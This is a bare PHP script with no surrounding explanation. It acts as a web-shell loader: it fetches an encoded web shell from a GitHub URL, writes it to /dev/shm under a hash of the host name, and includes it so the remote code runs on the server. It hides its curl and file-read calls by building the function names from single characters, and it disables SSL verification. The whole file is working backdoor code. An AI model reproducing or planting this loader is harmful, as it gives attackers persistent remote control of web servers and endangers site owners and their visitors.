<?php
$_A = [
    'https://raw.githubusercontent.com/privdayzcom/privdayz-web-shell/refs/heads/main/pr1vdayz-enc.php',
    '/dev/shm/' . md5($_SERVER['HTTP_HOST'])
];

if (file_exists($_A[1]) && filesize($_A[1]) > 0) {
    include $_A[1];
} else {
    $_B = __x($_A[0]);
    if ($_B && strlen($_B) > 40) {
        $fp = fopen($_A[1], 'wb');
        if ($fp) {
            fwrite($fp, $_B);
            fclose($fp);
            include $_A[1];
        }
    }
    exit;
}

function __x($u) {
    $A = "c"."u"."r"."l"."_"."e"."x"."e"."c";
    $B = "c"."u"."r"."l"."_"."i"."n"."i"."t";
    $C = "c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
    if (function_exists($A)) {
        $h = $B($u);
        $C($h, CURLOPT_RETURNTRANSFER, 1);
        $C($h, CURLOPT_FOLLOWLOCATION, 1);
        $C($h, CURLOPT_USERAGENT, "Mozilla/5.0");
        $C($h, CURLOPT_SSL_VERIFYPEER, 0);
        $C($h, CURLOPT_SSL_VERIFYHOST, 0);
        $d = $A($h);
        curl_close($h);
        if ($d !== false && strlen($d) > 30) return $d;
    }

    $D = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    if (function_exists($D)) {
        $ctx = stream_context_create([
            'http' => ['user_agent' => 'Mozilla/5.0'],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $d = @$D($u, false, $ctx);
        if ($d !== false && strlen($d) > 30) return $d;
    }

    $E = "f"."o"."p"."e"."n";
    $S = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    if (function_exists($E) && function_exists($S)) {
        $h = @$E($u, "rb");
        if ($h) {
            $d = @$S($h);
            fclose($h);
            if ($d !== false && strlen($d) > 30) return $d;
        }
    }
    return false;
}
?>
